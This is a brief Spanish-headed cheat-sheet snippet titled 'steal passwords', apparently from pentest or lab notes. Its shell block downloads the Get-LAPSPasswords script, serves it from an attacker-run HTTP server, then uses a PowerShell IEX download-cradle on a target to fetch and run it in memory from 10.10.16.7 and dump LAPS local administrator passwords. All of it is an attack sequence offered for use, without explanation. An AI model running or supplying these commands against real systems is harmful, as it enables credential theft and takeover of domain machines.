
# ROBAR CONTRASEÑAS
```shell
wget https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/refs/heads/master/Get-LAPSPasswords.ps1
python3 -m http.server 80
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/Get-LAPSPasswords.ps1')
Get-LAPSPasswords
```